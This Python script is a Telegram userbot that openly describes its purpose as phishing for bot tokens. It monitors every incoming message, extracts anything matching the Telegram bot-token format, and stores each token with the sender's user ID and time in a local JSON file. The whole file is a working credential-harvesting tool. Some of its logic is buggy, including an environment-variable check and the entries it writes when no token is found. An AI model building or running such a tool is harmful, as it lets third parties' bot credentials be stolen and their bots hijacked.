#!/usr/bin/env python3
#
# Author: jon4hz
# Date: 22.03.20201
# Desc: Telegram Userbot to phish for bot tokens
#
#######################################################################################################################

#######################################################################################################################
# IMPORTS
#######################################################################################################################
try:
    import sys, datetime, os, json, regex
    from telethon import TelegramClient, events
except ImportError as e:
    print(f'{datetime.datetime.utcnow()} - Error could not import modules - {e}')


#######################################################################################################################
# ENVIRONMENT
#######################################################################################################################

# check required vars
if not (os.environ.get('TELEGRAM_API_ID') or not 
        os.environ.get('TELEGRAM_API_HASH') or not 
        os.environ.get('TELEGRAM_PHONE')):
    print(f'{datetime.datetime.utcnow()} - Error: Please set all environment variables!')
    sys.exit(1)


#######################################################################################################################
# CONSTANTS
#######################################################################################################################

# set configs
try:
    # telegram client credentials
    API_ID = os.environ.get('TELEGRAM_API_ID')
    API_HASH = os.environ.get('TELEGRAM_API_HASH')
    PHONE = os.environ.get('TELEGRAM_PHONE')
except Exception as e:
    print(f'{datetime.datetime.utcnow()} - Error: Could not read variables from config \n - Missing Key: {e}')
    sys.exit(1)

REGEX_RULE = r'[0-9]{9}:[a-zA-Z0-9_-]{35}'

DATAFILE = os.environ.get('DATAFILE','data/tokens.json')

#######################################################################################################################
# TELETHON
#######################################################################################################################

# create client
try:
    client = TelegramClient(f'data/{PHONE}', API_ID, API_HASH)
    client.session.save()
except Exception as e:
    print(f'{datetime.datetime.utcnow()} - Error: Could not create client. - {e}')
    sys.exit(1)

@client.on(events.NewMessage())
async def handler(event) -> None:
    try:
        token = regex.findall(REGEX_RULE, event.message.message)[0]
    except IndexError:
        token = False
    if token:
        print(f'{datetime.datetime.utcnow()} - Info: Found Token {token} from user {event.sender_id}')
    # store token in file
    try:
        with open(DATAFILE, 'r') as f:
            try:
                data = json.load(f)
            except json.JSONDecodeError as e:
                print(f'{datetime.datetime.utcnow()} - Error: Could not read file. - {e}')
                print(f'{datetime.datetime.utcnow()} - Warning: Overwriting old file.')
                data = {}
            except Exception as e:
                print(f'{datetime.datetime.utcnow()} - Error: Could not read file. - {e}')
        with open(DATAFILE, 'w') as f:
            try:
                data[token] = {
                        'time': str(datetime.datetime.utcnow()),
                        'user_id': str(event.sender_id)
                    }
                json.dump(data, f)
            except Exception as e:
                print(f'{datetime.datetime.utcnow()} - Error: Could not write file. - {e}')
    # create file for the first time
    except FileNotFoundError:
        try:
            with open(DATAFILE, 'w') as f:
                json.dump({
                    str(token): {
                        'time': str(datetime.datetime.utcnow()),
                        'user_id': str(event.sender_id)
                    }
                }, f)
        except Exception as e:
            print(f'{datetime.datetime.utcnow()} - Error: Could not write file. - {e}')
    except Exception as e:
        print(f'{datetime.datetime.utcnow()} - Error: Could not write file. - {e}')


if __name__ == "__main__":
    # start the client
    try:
        client.start()
    except EOFError:
        print(f'\n{datetime.datetime.utcnow()} - Error: Please generate the session file first. Execute "sudo docker-compose run tokenphisher", fill the informations and start the container again!.')
        sys.exit(1)
    except Exception as e:
        print(f'{datetime.datetime.utcnow()} - Error: Could not create client. - {e}')
        sys.exit(1)
    print("Client started...")
    client.run_until_disconnected()
    print("Client closed...")